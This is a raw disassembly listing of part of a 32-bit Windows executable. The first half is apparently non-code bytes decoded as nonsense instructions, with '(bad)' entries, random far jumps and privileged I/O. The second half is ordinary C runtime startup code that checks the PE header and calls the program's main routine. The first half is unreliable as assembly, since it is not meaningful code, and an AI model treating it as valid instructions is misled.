  423dd8:	lds    ecx,FWORD PTR [esi+0x18]
  423ddb:	xchg   edx,esp
  423ddd:	ret    
  423dde:	popf   
  423ddf:	jecxz  0x423deb
  423de1:	pop    ss
  423de2:	mov    ds:0xcd506b7b,eax
  423de7:	das    
  423de8:	mov    ds:0x3f08c44a,al
  423ded:	(bad)  
  423dee:	js     0x423db0
  423df0:	mov    ch,0xba
  423df2:	leave  
  423df3:	stc    
  423df4:	lods   al,BYTE PTR ds:[esi]
  423df5:	lea    esi,[edi]
  423df7:	mov    ds:0x500aacba,eax
  423dfc:	nop
  423dfd:	lea    esp,[eax+ecx*8]
  423e00:	xchg   esi,eax
  423e01:	jl     0x423e64
  423e03:	jae    0x423d99
  423e05:	fwait
  423e06:	xor    al,0xfa
  423e08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e09:	and    BYTE PTR [edx+0x19],bh
  423e0c:	pop    eax
  423e0d:	imul   edx,DWORD PTR ds:0xddfa5d1c,0xada332b6
  423e17:	out    0x6f,al
  423e19:	shr    BYTE PTR [edi+eax*8+0x19836adb],0x55
  423e21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e23:	mov    DWORD PTR [ebp+0x31],esi
  423e26:	arpl   ax,di
  423e28:	add    BYTE PTR [eax-0x12],bl
  423e2b:	lea    edi,[edi+0x4e41b5d5]
  423e31:	sti    
  423e32:	fucomi st,st(0)
  423e34:	push   esi
  423e35:	out    dx,al
  423e36:	ja     0x423de6
  423e38:	mov    al,BYTE PTR [ebx+0x44]
  423e3b:	or     DWORD PTR [ebx+ecx*1-0x5d],eax
  423e3f:	pop    ss
  423e40:	nop
  423e41:	jecxz  0x423de2
  423e43:	test   BYTE PTR [edx-0x59a89b87],cl
  423e49:	mov    ebp,0x87972903
  423e4e:	test   BYTE PTR [ebx],ah
  423e50:	mov    ch,0xfc
  423e52:	mov    edx,0x7318ee3e
  423e57:	gs stos DWORD PTR es:[edi],eax
  423e59:	and    dl,BYTE PTR [ebx-0x73]
  423e5c:	and    DWORD PTR [eax+0x2f],edi
  423e5f:	int3   
  423e60:	sub    DWORD PTR [ecx-0x62],edx
  423e63:	in     eax,0x50
  423e65:	add    eax,0xaf779e7
  423e6a:	jle    0x423e01
  423e6c:	sti    
  423e6d:	(bad)  
  423e6e:	sbb    bl,dh
  423e70:	xor    al,0xa1
  423e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e73:	call   0x6eb9:0x498fc291
  423e7a:	lds    eax,FWORD PTR [edi+esi*8+0x42a75157]
  423e81:	aaa    
  423e82:	mov    DWORD PTR [eax-0x5d],edx
  423e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e86:	leave  
  423e87:	mov    ds:0x28cd43cf,eax
  423e8c:	push   esi
  423e8d:	sti    
  423e8e:	xor    al,0x7c
  423e90:	adc    al,0x8a
  423e92:	int3   
  423e93:	test   al,0x60
  423e95:	mov    ah,0xa7
  423e97:	in     al,dx
  423e98:	adc    al,0xeb
  423e9a:	(bad)  
  423e9b:	fcomp  DWORD PTR [edi-0x3]
  423e9e:	push   ebp
  423e9f:	call   0x2c8c0d6b
  423ea4:	in     al,dx
  423ea5:	push   0xb8e10dc6
  423eaa:	call   0xcee7e0cd
  423eaf:	jmp    0x423ee7
  423eb1:	in     eax,dx
  423eb2:	icebp  
  423eb3:	mov    ecx,0xfd95d238
  423eb8:	sahf   
  423eb9:	setb   BYTE PTR [ebx]
  423ebc:	hlt    
  423ebd:	pushf  
  423ebe:	ret    0x75d3
  423ec1:	mov    ch,0xa7
  423ec3:	repz xchg esi,eax
  423ec5:	call   0x6008:0x8b03c76f
  423ecc:	mov    eax,ds:0x5ef0db49
  423ed1:	xchg   ebx,eax
  423ed2:	xchg   ecx,eax
  423ed3:	push   ecx
  423ed4:	or     edi,0x5c
  423ed7:	in     eax,0x1
  423ed9:	xor    eax,0x57ac8f2a
  423ede:	push   cs
  423edf:	in     eax,0xed
  423ee1:	pusha  
  423ee2:	xor    ebx,esi
  423ee4:	ja     0x423e6d
  423ee6:	aaa    
  423ee7:	sub    al,0xa0
  423ee9:	mov    eax,0x1e302dc8
  423eee:	jle    0x423e70
  423ef0:	mov    al,0xb6
  423ef2:	nop
  423ef3:	loop   0x423eaf
  423ef5:	fwait
  423ef6:	jmp    0x5f:0x5d7b5d34
  423efd:	mov    ds:0xf8b3c015,eax
  423f02:	push   esp
  423f03:	jle    0x423ea1
  423f05:	popf   
  423f06:	test   BYTE PTR [edi+0x4c],dl
  423f09:	icebp  
  423f0a:	cmc    
  423f0b:	ss adc eax,0x653cc1c0
  423f11:	and    DWORD PTR [ebx-0x18],esp
  423f14:	jns    0x423f5e
  423f16:	mov    ebp,0xcd9c90b7
  423f1b:	or     al,0x2b
  423f1d:	and    eax,0x5d43bb94
  423f22:	aad    0x2d
  423f24:	or     al,0x77
  423f26:	and    BYTE PTR [ebx],ch
  423f28:	sbb    eax,0x54a70193
  423f2d:	mov    dh,0xea
  423f2f:	and    DWORD PTR [esi],esi
  423f31:	push   esp
  423f32:	in     eax,0x5c
  423f34:	ins    BYTE PTR es:[edi],dx
  423f35:	inc    eax
  423f36:	and    ebx,DWORD PTR [ecx+eiz*2-0x36ed673e]
  423f3d:	add    esi,DWORD PTR ds:0xe72302a9
  423f43:	into   
  423f44:	sub    eax,0xe07237e9
  423f49:	pushf  
  423f4a:	dec    edi
  423f4b:	jae    0x423f7d
  423f4d:	test   BYTE PTR [esp+0x70],dh
  423f51:	add    BYTE PTR [ebx],cl
  423f53:	and    eax,0x9f67c758
  423f58:	call   0x18e4:0x29a2f8e0
  423f5f:	dec    eax
  423f60:	test   BYTE PTR [esi+0x0],cl
  423f63:	ficom  WORD PTR [eax+ecx*4]
  423f66:	cmp    eax,0xc067f4af
  423f6b:	das    
  423f6c:	cdq    
  423f6d:	in     eax,0x9b
  423f6f:	sti    
  423f70:	sbb    al,0x6
  423f72:	xor    cl,dl
  423f74:	jle    0x423f3d
  423f76:	xor    BYTE PTR [ecx+0x55],0x95
  423f7a:	xchg   ebx,eax
  423f7b:	fbstp  TBYTE PTR [esi]
  423f7d:	cli    
  423f7e:	sub    al,0xd8
  423f80:	xor    eax,0xa7d89cf9
  423f85:	and    ebp,eax
  423f87:	(bad)  
  423f88:	mov    ds:0x1cb845d8,eax
  423f8d:	sbb    DWORD PTR [ecx+0x10ea8869],ecx
  423f93:	cmc    
  423f94:	jmp    0x423fe3
  423f96:	shl    BYTE PTR [ebx+0x6d],cl
  423f99:	addr16 js 0x423f38
  423f9c:	enter  0xccb0,0x44
  423fa0:	test   ebx,ebp
  423fa2:	jle    0x423f82
  423fa4:	nop
  423fa5:	sub    al,0x88
  423fa7:	(bad)  
  423faa:	mov    esp,0x3fb79fce
  423faf:	add    bl,ch
  423fb1:	mov    al,0x88
  423fb3:	cmp    cl,BYTE PTR [eax]
  423fb5:	push   esi
  423fb6:	aas    
  423fb7:	sbb    BYTE PTR [ebx-0x25a5c8a5],bl
  423fbd:	fwait
  423fbe:	adc    dh,BYTE PTR ds:0x80bd5d12
  423fc4:	lahf   
  423fc5:	dec    ebx
  423fc6:	call   0x3151cb74
  423fcb:	iret   
  423fcc:	mov    bl,0x5
  423fce:	outs   dx,DWORD PTR ds:[esi]
  423fcf:	sbb    edi,DWORD PTR [ebx]
  423fd1:	and    eax,0x54d998d
  423fd6:	aad    0x10
  423fd8:	lahf   
  423fd9:	test   DWORD PTR [esi+0x77],edx
  423fdc:	inc    esp
  423fdd:	xor    ebx,esi
  423fdf:	inc    eax
  423fe0:	and    cl,BYTE PTR [esi+0x6f]
  423fe3:	rcl    al,1
  423fe5:	push   0xfffffff0
  423fe7:	or     eax,0x1a
  423fea:	or     ch,cl
  423fec:	int    0xc0
  423fee:	push   ecx
  423fef:	clc    
  423ff0:	imul   eax,DWORD PTR ds:0xb33b5a23,0xffffff91
  423ff7:	sahf   
  423ff8:	das    
  423ff9:	mov    BYTE PTR [edi+eax*1+0x51],bl
  423ffd:	sahf   
  423ffe:	add    eax,0x5ff38184
  424003:	pusha  
  424004:	test   bh,cl
  424006:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424007:	sub    DWORD PTR [edi-0x70],ebx
  42400a:	and    edi,eax
  42400c:	sub    cl,bl
  42400e:	push   edx
  42400f:	addr16 inc ebx
  424011:	inc    edi
  424012:	jno    0x423fe3
  424014:	dec    esp
  424015:	push   ds
  424016:	out    dx,eax
  424017:	cmp    eax,0xf53f5d4d
  42401c:	mov    al,ds:0xf6c7c4c0
  424021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424022:	retf   0xfa13
  424025:	xchg   edx,eax
  424026:	mov    ds:0xa5fdcb2,eax
  42402b:	push   esi
  42402c:	bound  esp,QWORD PTR [eax]
  42402e:	test   ah,0x61
  424031:	xor    al,0x76
  424033:	mov    al,ds:0x1acebab3
  424038:	std    
  424039:	loopne 0x424060
  42403b:	adc    BYTE PTR ds:0x221d5088,cl
  424041:	in     al,0xfb
  424043:	sahf   
  424044:	push   ebp
  424045:	mov    ds:0xa3a855ef,eax
  42404a:	leave  
  42404b:	mov    dh,BYTE PTR [edx]
  42404d:	jecxz  0x423fec
  42404f:	icebp  
  424050:	daa    
  424051:	shl    DWORD PTR [eax],1
  424053:	push   0xffffffbb
  424055:	fdivr  DWORD PTR [edx-0x3b]
  424058:	add    ecx,DWORD PTR [ebx+ebx*8-0x6fcaa338]
  42405f:	cmp    ebx,DWORD PTR [esi+0x63]
  424062:	or     al,0xf3
  424064:	jle    0x424089
  424066:	jnp    0x424076
  424068:	and    dl,BYTE PTR [edi-0x43]
  42406b:	sub    ebp,esi
  42406d:	xor    DWORD PTR [ecx+eiz*2-0x20],edi
  424071:	je     0x424025
  424073:	lds    eax,FWORD PTR [edi-0x40556b37]
  424079:	and    esp,DWORD PTR [edi]
  42407b:	out    dx,al
  42407c:	ret    
  42407d:	mov    ds:0x7894b8e0,eax
  424082:	dec    esp
  424083:	hlt    
  424084:	cmp    DWORD PTR [ebx+eiz*2-0x25d9d5c0],esi
  42408b:	js     0x4240a0
  42408d:	sahf   
  42408e:	push   esp
  42408f:	neg    BYTE PTR [esi-0x46]
  424092:	es mov dh,0x1e
  424095:	je     0x4240e2
  424097:	iret   
  424098:	and    al,0xbe
  42409a:	mov    eax,ds:0xda031c3f
  42409f:	push   es
  4240a0:	arpl   WORD PTR [ebx],si
  4240a2:	or     ebx,ecx
  4240a4:	xchg   edx,eax
  4240a5:	rcl    BYTE PTR [edx-0x32],cl
  4240a8:	daa    
  4240a9:	mov    ds:0xa27dc108,eax
  4240ae:	mov    edx,0xc03d82a1
  4240b3:	or     ebp,DWORD PTR [ecx+0x1f]
  4240b6:	repz cs mov ebx,0x8ee7c4c1
  4240bd:	sbb    DWORD PTR [ebx],ebp
  4240bf:	leave  
  4240c0:	(bad)  
  4240c1:	jg     0x42412f
  4240c3:	lock in al,0x79
  4240c6:	cmp    BYTE PTR [ecx-0xb88a7a],bh
  4240cc:	and    eax,0xbf68a29
  4240d1:	inc    edi
  4240d2:	out    0x33,eax
  4240d4:	push   esi
  4240d5:	ss push ecx
  4240d7:	sub    DWORD PTR [eax],esp
  4240d9:	or     cl,al
  4240db:	push   ebx
  4240dc:	leave  
  4240dd:	std    
  4240de:	adc    esp,esp
  4240e0:	cmp    cl,BYTE PTR [eax-0x21357259]
  4240e6:	pop    ss
  4240e7:	ret    
  4240e8:	sti    
  4240e9:	lahf   
  4240ea:	mov    eax,0xdbf7383e
  4240ef:	loope  0x4240b3
  4240f1:	rcl    BYTE PTR [edx-0x11],cl
  4240f4:	push   ecx
  4240f5:	mov    ah,0x83
  4240f7:	test   DWORD PTR [edx+ebx*1+0x72c7c47c],0x9bc572e1
  424102:	ins    DWORD PTR es:[edi],dx
  424103:	rcr    DWORD PTR ds:0x7fb8fe94,cl
  424109:	xor    DWORD PTR [ecx+edi*2],ebx
  42410c:	jmp    0xb21b:0x3cf970a7
  424113:	fdivr  QWORD PTR [ebx+0x76]
  424116:	push   esi
  424117:	xor    BYTE PTR [edx-0x2551628],bh
  42411d:	ins    DWORD PTR es:[edi],dx
  42411e:	dec    esp
  42411f:	pop    edx
  424120:	das    
  424121:	out    dx,al
  424122:	repnz inc edx
  424124:	pop    es
  424125:	ins    BYTE PTR es:[edi],dx
  424126:	xchg   esp,eax
  424127:	ins    BYTE PTR es:[edi],dx
  424128:	out    0x77,al
  42412a:	mov    edi,0x8b25ec9e
  42412f:	jecxz  0x4240fe
  424131:	or     dl,0xd7
  424134:	pop    edx
  424135:	xor    al,BYTE PTR [edi-0x6b]
  424138:	mov    al,ds:0xeb25b128
  42413d:	daa    
  42413e:	sti    
  42413f:	pop    edx
  424140:	fld    TBYTE PTR [ecx-0x4fc2a278]
  424146:	test   al,0x2a
  424148:	push   ds
  424149:	mov    bh,0xdb
  42414b:	retf   0xe64e
  42414e:	xlat   BYTE PTR ds:[ebx]
  42414f:	out    0xf0,eax
  424151:	std    
  424152:	test   al,0x81
  424154:	cmp    DWORD PTR [ecx-0x1c],ebx
  424157:	outs   dx,DWORD PTR ds:[esi]
  424158:	(bad)  
  424159:	sbb    BYTE PTR [ebp+0x20],dl
  42415c:	retf   0x790d
  42415f:	sti    
  424160:	sbb    edx,ecx
  424162:	mov    ds:0x8508a979,al
  424167:	adc    ebx,DWORD PTR [eax]
  424169:	jg     0x4240fa
  42416b:	mov    ah,BYTE PTR [ebx-0x1a]
  42416e:	pop    edi
  42416f:	ficomp DWORD PTR ds:0xb09eccb8
  424175:	inc    ecx
  424176:	enter  0xa34,0x3f
  42417a:	sbb    ah,BYTE PTR [ebp-0x3eb5240f]
  424180:	fcmovu st,st(5)
  424182:	cmp    DWORD PTR [eax+edi*1],ebx
  424185:	mov    cl,0xe1
  424187:	push   cs
  424188:	fnsave [eax-0x74]
  42418b:	and    esi,ebx
  42418d:	loope  0x424176
  42418f:	enter  0x1cd8,0x4f
  424193:	stc    
  424194:	push   eax
  424195:	sbb    eax,edx
  424197:	arpl   WORD PTR [ebp+0x3039d62c],si
  42419d:	iret   
  42419e:	add    BYTE PTR es:[edx],0x3d
  4241a2:	cwde   
  4241a3:	sti    
  4241a4:	cmc    
  4241a5:	es pusha 
  4241a7:	test   al,0x40
  4241a9:	or     al,al
  4241ab:	ins    BYTE PTR es:[edi],dx
  4241ac:	inc    ebx
  4241ad:	xchg   esp,eax
  4241ae:	test   ah,dl
  4241b0:	fistp  DWORD PTR [edx+0x31]
  4241b3:	imul   ecx,DWORD PTR [edi+0x2c7ba6a6],0xab5d4c5d
  4241bd:	cmp    ch,0x13
  4241c0:	retf   0x598c
  4241c3:	push   esp
  4241c4:	inc    esi
  4241c5:	repz jecxz 0x424154
  4241c8:	retf   0x989d
  4241cb:	dec    esp
  4241cc:	(bad)
  4241cf:	jnp    0x42421a
  4241d1:	inc    edi
  4241d2:	inc    BYTE PTR [ebx+eax*8-0x7b]
  4241d6:	(bad)  
  4241d8:	imul   edi,DWORD PTR [edi],0xffffffbc
  4241db:	cmp    eax,0xa8034d16
  4241e0:	jb     0x424253
  4241e2:	iret   
  4241e3:	stos   DWORD PTR es:[edi],eax
  4241e4:	inc    edx
  4241e5:	add    eax,0x8abdabcb
  4241ea:	in     al,0xac
  4241ec:	mov    WORD PTR [esi],?
  4241ee:	mov    dh,0x47
  4241f0:	mov    ebx,0xdb7446f2
  4241f5:	mov    eax,ds:0x192d58d5
  4241fa:	mov    ds:0x530b98d8,al
  4241ff:	mov    dh,0xfd
  424201:	pop    edx
  424202:	push   0x5d
  424204:	mov    ecx,0x87c92faa
  424209:	ins    DWORD PTR es:[edi],dx
  42420a:	add    esi,DWORD PTR [eax+eax*8-0x5f40fd45]
  424211:	jne    0x4241b0
  424213:	out    dx,eax
  424214:	mov    DWORD PTR [edi-0x4b],ebp
  424217:	xchg   esp,eax
  424218:	shr    ecx,0x60
  42421b:	or     esi,ecx
  42421d:	rcl    al,cl
  42421f:	dec    esi
  424220:	xchg   esp,eax
  424221:	in     eax,dx
  424222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424223:	mov    ah,dh
  424225:	mov    ebp,0xd6cba94a
  42422a:	out    dx,al
  42422b:	aas    
  42422c:	mov    ebx,DWORD PTR [esi]
  42422e:	jmp    0x42422d
  424230:	mov    bl,0x91
  424232:	adc    al,0xc6
  424234:	jle    0x4241d4
  424236:	cli    
  424237:	dec    ebp
  424238:	push   eax
  424239:	xchg   esi,eax
  42423a:	mov    esi,0x5ee446f9
  42423f:	sub    BYTE PTR [ecx+0x15],0xf2
  424243:	scas   eax,DWORD PTR es:[edi]
  424244:	or     eax,DWORD PTR [ebx-0x78]
  424247:	into   
  424248:	jp     0x4241d4
  42424a:	xor    cl,dh
  42424c:	xchg   edi,eax
  42424d:	mov    eax,0xa7b11514
  424252:	pop    edi
  424253:	mov    bh,0xf
  424255:	into   
  424256:	jnp    0x424295
  424258:	lahf   
  424259:	addr16 cld 
  42425b:	fwait
  42425c:	(bad)  
  42425d:	and    edx,eax
  42425f:	mov    ?,edi
  424261:	dec    ebp
  424262:	push   0x587f9168
  424267:	mov    es,eax
  424269:	add    al,0xda
  42426b:	add    ecx,DWORD PTR [ecx-0x42]
  42426e:	cmp    eax,0xbff30400
  424273:	mov    ebp,0x8193bec2
  424278:	mov    esi,0x706f27d3
  42427d:	jae    0x42427a
  42427f:	push   ecx
  424280:	sti    
  424281:	outs   dx,DWORD PTR ds:[esi]
  424282:	xchg   esi,eax
  424283:	stos   DWORD PTR es:[edi],eax
  424284:	xlat   BYTE PTR ds:[ebx]
  424285:	test   DWORD PTR [ebp-0x1d],edx
  424288:	push   esp
  424289:	jmp    DWORD PTR [eax]
  42428b:	in     eax,0x1f
  42428d:	xchg   esp,eax
  42428e:	mov    ecx,0x5dae4356
  424293:	lds    sp,DWORD PTR [eax-0x474e1028]
  42429a:	std    
  42429b:	jl     0x42423a
  42429d:	xchg   ecx,eax
  42429e:	sti    
  42429f:	sti    
  4242a0:	jbe    0x42422f
  4242a2:	jne    0x42423e
  4242a4:	pop    esi
  4242a5:	mov    eax,0xf411696f
  4242aa:	std    
  4242ab:	test   BYTE PTR [ecx+esi*2],bh
  4242ae:	jmp    0xb45a:0x6f5b3edd
  4242b5:	cwde   
  4242b6:	lock mov ds:0x373a68a0,eax
  4242bc:	pop    esi
  4242bd:	adc    eax,0x14996a09
  4242c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242c3:	xlat   BYTE PTR ds:[ebx]
  4242c4:	ds je  0x42424c
  4242c7:	leave  
  4242c8:	mov    bh,0x8b
  4242ca:	inc    ebp
  4242cb:	jne    0x424287
  4242cd:	jno    0x424347
  4242cf:	jge    0x42429f
  4242d1:	xchg   esi,eax
  4242d2:	push   eax
  4242d3:	and    DWORD PTR [ecx-0x222e11f3],ebx
  4242d9:	enter  0x2f67,0x64
  4242dd:	cmp    eax,0x7b12fdca
  4242e2:	ss call 0xea05:0x8b2c8c05
  4242ea:	(bad)  
  4242eb:	addr16 push ds
  4242ed:	add    eax,0x4e43262b
  4242f2:	mov    ch,0xec
  4242f4:	jae    0x424354
  4242f6:	js     0x4242aa
  4242f8:	adc    eax,0x75d4e054
  4242fd:	icebp  
  4242fe:	jmp    0x9492577
  424303:	inc    eax
  424304:	inc    esp
  424305:	sbb    al,0x1f
  424307:	lods   eax,DWORD PTR ds:[esi]
  424308:	jmp    0x70f50ccc
  42430d:	lods   eax,DWORD PTR ds:[esi]
  42430e:	not    BYTE PTR [ecx+eiz*1]
  424311:	ja     0x42432a
  424313:	mov    BYTE PTR [eax+0x7],ah
  424316:	mov    edx,ds
  424318:	cwde   
  424319:	and    DWORD PTR [ebx],ebx
  42431b:	sbb    edx,DWORD PTR [eax+0x3e5b7b95]
  424321:	ret    0x8f26
  424324:	and    dh,ch
  424326:	fisub  WORD PTR [ebp-0x2502d7b0]
  42432c:	cmp    al,0x95
  42432e:	int3   
  42432f:	outs   dx,DWORD PTR ds:[esi]
  424330:	clc    
  424331:	inc    ebx
  424332:	jl     0x4242bc
  424334:	jne    0x4242fe
  424336:	mov    al,0xb3
  424338:	cdq    
  424339:	adc    eax,DWORD PTR [ebx-0x1f]
  42433c:	or     DWORD PTR [ecx+ecx*8],0x8b15435f
  424343:	push   ebp
  424344:	sub    edx,DWORD PTR [ebp-0x6854bb04]
  42434a:	daa    
  42434b:	cmp    eax,0x248a645f
  424350:	aad    0x43
  424352:	gs out 0xc9,eax
  424355:	sbb    esi,DWORD PTR [esi+0x4b1e6895]
  42435b:	ja     0x424365
  42435d:	shufps xmm0,XMMWORD PTR [eax],0x66
  424361:	mov    BYTE PTR [ecx+0x4a],ah
  424364:	jmp    0x424331
  424366:	xchg   edi,eax
  424367:	ds xor eax,0xdddf44ce
  42436d:	scas   al,BYTE PTR es:[edi]
  42436e:	mov    cx,0x39d2
  424372:	je     0x4243cf
  424374:	or     DWORD PTR [ecx-0xfeaf08c],esi
  42437a:	inc    ebp
  42437b:	(bad)  
  42437c:	arpl   WORD PTR [eax],si
  42437e:	test   DWORD PTR [ebx+0x72],edx
  424381:	xchg   ebx,eax
  424382:	mov    DWORD PTR [eax],edi
  424384:	xchg   DWORD PTR [eax+0xf24f832],edx
  42438a:	pop    ecx
  42438b:	shr    BYTE PTR [ecx],1
  42438d:	lock repz add eax,0x86489a38
  424394:	cwde   
  424395:	fidivr WORD PTR [ebx+0x9040e85]
  42439b:	popa   
  42439c:	adc    BYTE PTR [edx+0x687ee7f7],ah
  4243a2:	and    DWORD PTR [ebx+eiz*8+0xf],ebx
  4243a6:	imul   eax,DWORD PTR [ebp+0x1b],0x55
  4243aa:	xor    DWORD PTR [ebp+0x5452bee6],esi
  4243b0:	cmp    ebx,DWORD PTR [edi+ebx*4-0x7d]
  4243b4:	mov    bh,0x46
  4243b6:	and    ch,dl
  4243b8:	and    bl,0xf3
  4243bb:	push   0xe540570e
  4243c0:	cli    
  4243c1:	popf   
  4243c2:	(bad)  
  4243c3:	in     al,dx
  4243c4:	cmp    ebp,DWORD PTR [ecx-0x5d302e11]
  4243ca:	enter  0x80ef,0x63
  4243ce:	iret   
  4243cf:	mov    cl,0x2e
  4243d1:	pusha  
  4243d2:	jbe    0x42440f
  4243d4:	cmp    dh,BYTE PTR [ebx+0x26]
  4243d7:	mov    ah,0xff
  4243d9:	jmp    0x4243c6
  4243db:	add    al,0xa6
  4243dd:	inc    ecx
  4243de:	mov    ah,0x82
  4243e0:	and    ebx,DWORD PTR [eax]
  4243e2:	dec    ecx
  4243e3:	push   0x8791206d
  4243e8:	loope  0x424372
  4243ea:	lock jmp 0xfa33ea84
  4243f0:	push   ss
  4243f1:	mov    dh,0x8d
  4243f3:	lock les ebp,FWORD PTR [eax]
  4243f6:	adc    bl,BYTE PTR [edx]
  4243f8:	mul    ebx
  4243fa:	pop    ebp
  4243fb:	mov    al,ds:0x6ae322
  424400:	push   0x0
  424402:	call   0x424410
  424407:	xor    eax,eax
  424409:	add    esp,0x10
  42440c:	ret    0x10
  42440f:	nop
  424410:	jmp    DWORD PTR ds:0x429114
  424416:	cmp    DWORD PTR ds:0x45dabc,0x1
  42441d:	jne    0x424424
  42441f:	call   0x424962
  424424:	push   DWORD PTR [esp+0x4]
  424428:	call   0x4247eb
  42442d:	push   0xff
  424432:	call   DWORD PTR ds:0x45d1c0
  424438:	pop    ecx
  424439:	pop    ecx
  42443a:	ret    
  42443b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424442:	jne    0x424449
  424444:	call   0x424962
  424449:	push   DWORD PTR [esp+0x4]
  42444d:	call   0x4247eb
  424452:	push   0xff
  424457:	call   0x424631
  42445c:	pop    ecx
  42445d:	pop    ecx
  42445e:	ret    
  42445f:	push   0x60
  424461:	push   0x429228
  424466:	call   0x425350
  42446b:	mov    edi,0x94
  424470:	mov    eax,edi
  424472:	call   0x4253a0
  424477:	mov    DWORD PTR [ebp-0x18],esp
  42447a:	mov    esi,esp
  42447c:	mov    DWORD PTR [esi],edi
  42447e:	push   esi
  42447f:	call   DWORD PTR ds:0x429058
  424485:	mov    ecx,DWORD PTR [esi+0x10]
  424488:	mov    DWORD PTR ds:0x45dac4,ecx
  42448e:	mov    eax,DWORD PTR [esi+0x4]
  424491:	mov    ds:0x45dad0,eax
  424496:	mov    edx,DWORD PTR [esi+0x8]
  424499:	mov    DWORD PTR ds:0x45dad4,edx
  42449f:	mov    esi,DWORD PTR [esi+0xc]
  4244a2:	and    esi,0x7fff
  4244a8:	mov    DWORD PTR ds:0x45dac8,esi
  4244ae:	cmp    ecx,0x2
  4244b1:	je     0x4244bf
  4244b3:	or     esi,0x8000
  4244b9:	mov    DWORD PTR ds:0x45dac8,esi
  4244bf:	shl    eax,0x8
  4244c2:	add    eax,edx
  4244c4:	mov    ds:0x45dacc,eax
  4244c9:	xor    esi,esi
  4244cb:	push   esi
  4244cc:	mov    edi,DWORD PTR ds:0x429024
  4244d2:	call   edi
  4244d4:	cmp    WORD PTR [eax],0x5a4d
  4244d9:	jne    0x4244fa
  4244db:	mov    ecx,DWORD PTR [eax+0x3c]
  4244de:	add    ecx,eax
  4244e0:	cmp    DWORD PTR [ecx],0x4550
  4244e6:	jne    0x4244fa
  4244e8:	movzx  eax,WORD PTR [ecx+0x18]
  4244ec:	cmp    eax,0x10b
  4244f1:	je     0x424512
  4244f3:	cmp    eax,0x20b
  4244f8:	je     0x4244ff
  4244fa:	mov    DWORD PTR [ebp-0x1c],esi
  4244fd:	jmp    0x424526
  4244ff:	cmp    DWORD PTR [ecx+0x84],0xe
  424506:	jbe    0x4244fa
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xf8],esi
  424510:	jmp    0x424520
  424512:	cmp    DWORD PTR [ecx+0x74],0xe
  424516:	jbe    0x4244fa
  424518:	xor    eax,eax
  42451a:	cmp    DWORD PTR [ecx+0xe8],esi
  424520:	setne  al
  424523:	mov    DWORD PTR [ebp-0x1c],eax
  424526:	push   0x1
  424528:	call   0x4252fd
  42452d:	pop    ecx
  42452e:	test   eax,eax
  424530:	jne    0x42453a
  424532:	push   0x1c
  424534:	call   0x42443b
  424539:	pop    ecx
  42453a:	call   0x425274
  42453f:	test   eax,eax
  424541:	jne    0x42454b
  424543:	push   0x10
  424545:	call   0x42443b
  42454a:	pop    ecx
  42454b:	call   0x42515d
  424550:	mov    DWORD PTR [ebp-0x4],esi
  424553:	call   0x424f5f
  424558:	test   eax,eax
  42455a:	jge    0x424564
  42455c:	push   0x1b
  42455e:	call   0x424416
  424563:	pop    ecx
  424564:	call   DWORD PTR ds:0x429054
  42456a:	mov    ds:0x45e274,eax
  42456f:	call   0x424e3d
  424574:	mov    ds:0x45dab4,eax
  424579:	call   0x424d9b
  42457e:	test   eax,eax
  424580:	jge    0x42458a
  424582:	push   0x8
  424584:	call   0x424416
  424589:	pop    ecx
  42458a:	call   0x424b68
  42458f:	test   eax,eax
  424591:	jge    0x42459b
  424593:	push   0x9
  424595:	call   0x424416
  42459a:	pop    ecx
  42459b:	call   0x424673
  4245a0:	mov    DWORD PTR [ebp-0x20],eax
  4245a3:	cmp    eax,esi
  4245a5:	je     0x4245ae
  4245a7:	push   eax
  4245a8:	call   0x424416
  4245ad:	pop    ecx
  4245ae:	mov    DWORD PTR [ebp-0x38],esi
  4245b1:	lea    eax,[ebp-0x64]
  4245b4:	push   eax
  4245b5:	call   DWORD PTR ds:0x429050
  4245bb:	call   0x424aff
  4245c0:	mov    DWORD PTR [ebp-0x68],eax
  4245c3:	test   BYTE PTR [ebp-0x38],0x1
  4245c7:	je     0x4245cf
  4245c9:	movzx  eax,WORD PTR [ebp-0x34]
  4245cd:	jmp    0x4245d2
  4245cf:	push   0xa
  4245d1:	pop    eax
  4245d2:	push   eax
  4245d3:	push   DWORD PTR [ebp-0x68]
  4245d6:	push   esi
  4245d7:	push   esi
  4245d8:	call   edi
  4245da:	push   eax
  4245db:	call   0x422f90
  4245e0:	mov    edi,eax
  4245e2:	mov    DWORD PTR [ebp-0x6c],edi
  4245e5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245e8:	jne    0x4245f0
  4245ea:	push   edi
  4245eb:	call   0x4247ab
  4245f0:	call   0x4247cd
  4245f5:	jmp    0x424622
  4245f7:	mov    eax,DWORD PTR [ebp-0x14]
  4245fa:	mov    ecx,DWORD PTR [eax]
  4245fc:	mov    ecx,DWORD PTR [ecx]
  4245fe:	mov    DWORD PTR [ebp-0x70],ecx
  424601:	push   eax
  424602:	push   ecx
  424603:	call   0x42499b
  424608:	pop    ecx
  424609:	pop    ecx
  42460a:	ret    
  42460b:	mov    esp,DWORD PTR [ebp-0x18]
  42460e:	mov    edi,DWORD PTR [ebp-0x70]
  424611:	cmp    DWORD PTR [ebp-0x1c],0x0
  424615:	jne    0x42461d
  424617:	push   edi
  424618:	call   0x4247bc
  42461d:	call   0x4247dc
  424622:	or     DWORD PTR [ebp-0x4],0xffffffff
  424626:	mov    eax,edi
  424628:	lea    esp,[ebp-0x7c]
  42462b:	call   0x42538b
  424630:	ret    
  424631:	push   0x429244
  424636:	call   DWORD PTR ds:0x429024
  42463c:	test   eax,eax
  42463e:	je     0x424656
  424640:	push   0x429234
  424645:	push   eax
  424646:	call   DWORD PTR ds:0x429020
  42464c:	test   eax,eax
  42464e:	je     0x424656
  424650:	push   DWORD PTR [esp+0x4]
  424654:	call   eax
  424656:	push   DWORD PTR [esp+0x4]
  42465a:	call   DWORD PTR ds:0x42905c
  424660:	int3   
  424661:	push   0x8
  424663:	call   0x42550f
